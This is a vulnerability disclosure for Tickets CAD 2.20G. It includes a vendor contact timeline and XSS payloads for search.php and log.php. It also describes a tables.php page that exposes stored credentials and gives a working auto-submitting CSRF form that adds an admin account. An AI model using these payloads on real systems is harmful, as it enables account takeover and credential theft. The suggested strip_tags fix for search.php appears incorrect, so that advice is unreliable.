@@ -1,0 +1,77 @@
+# Exploit Title: Tickets CAD 2.20G Multiple Vulnerabilities
+# Date: Aug 4 2012 
+# Exploit Author: chap0 @_chap0
+# Vendor Homepage: http://www.ticketscad.org
+# Software Link: http://www.ticketscad.org/downloads/Tickets_06_22_2012_V220G.zip
+# Version: 2.20G
+# Tested on: Ubuntu
+
+Tickets CAD 2.20G is vulnerable to multiple vulnerabilities including Reflective/Stored XSS,
+information disclosure and CSRF. While logged in even with the default guest/guest 
+credentials, the guest user is able to store and execute arbitrary JavaScript code withing the 
+application. Information disclosure also exist, the application does not properly check 
+which user is currently logged in. Finally CSRF is also possible within the Tickets CAD 
+application which allows an attacker to successfully add an admin account.
+
+
+# Disclosure Time line
+# Jun 30 2012 - Contacted vendor
+# Jun 30 2012 - Vendor responds ask for details
+# Jun 30 2012 - Sent vendor vulnerability details
+# Jul 01 2012 - Vendor responds vulnerability sent to Dev team
+# Jul 09 2012 - Email to vendors for an update on issues
+# Jul 18 2012 - Dev team responds vulnerabilities will be fix in next release
+# Jul 23 2012 - Email to Dev team ask for an update and when next release will be issued
+# Aug 04 2012 - Dev team became unresponsive Public Disclosure
+
+[+] A Reflective XSS vulnerability exist in the search function, search.php within the application
+
+'><script>alert('XSS')</script>
+
+[+] A Stored XSS vulnerability exist in log.php while creating a new log entry
+
+'><script>alert('XSS')</script>
+
+
+[+] Both of these vulnerabilities can be prevented by using strip_tags:
+
+search.php fix is on line 88 vulnerability on 87
+
+86 <?php 
+87	//$post_frm_query = (array_key_exists('frm_query', ($_POST))) ? $_POST['frm_query']  : "" ;
+88	$post_frm_query = (array_key_exists('frm_query', strip_tags($_POST))) ? $_POST['frm_query']  : "" ;
+
+
+
+log.php fix is on line 148 vulnerable code on 147
+
+146  case "add":
+147	//do_log($GLOBALS['LOG_COMMENT'], $ticket_id=0, $responder_id=0, trim($_POST['frm_comment']));
+148	do_log($GLOBALS['LOG_COMMENT'], $ticket_id=0, $responder_id=0, strip_tags(trim($_POST['frm_comment'])));
+149	break;
+
+
+[+] Information disclosure exist which allows users even the guest account to view the tables of the sql database.
+
+If a user browses to: 
+
+	http://<Server>/tables.php 
+
+they are able to select which table within the database they wish to view including ALL users credentials.
+
+
+[+] CSRF poc, the password must be in md5 format in order for this attack to work
+
+<html> 
+ <body onload="javascript:document.forms[0].submit()">
+ <form method="POST" name="form0" action="http://127.0.0.1/config.php?func=user&add=true&go=true">
+ <input type="hidden" name="frm_group[]" value="1"/>
+ <input type="hidden" name="frm_user" value="chap0"/>
+ <input type="hidden" name="frm_level" value="0"/>
+ <input type="hidden" name="frm_responder_sel" value="0"/>
+ <input type="hidden" name="frm_func" value="a"/>
+<input type="hidden" name="frm_hash" value="916b5dbd201b469998d9b4a4c8bc4e08"/>
+ <input type="hidden" name="frm_responder_id" value="0"/>
+ </form>
+ </body>
+ </html> 
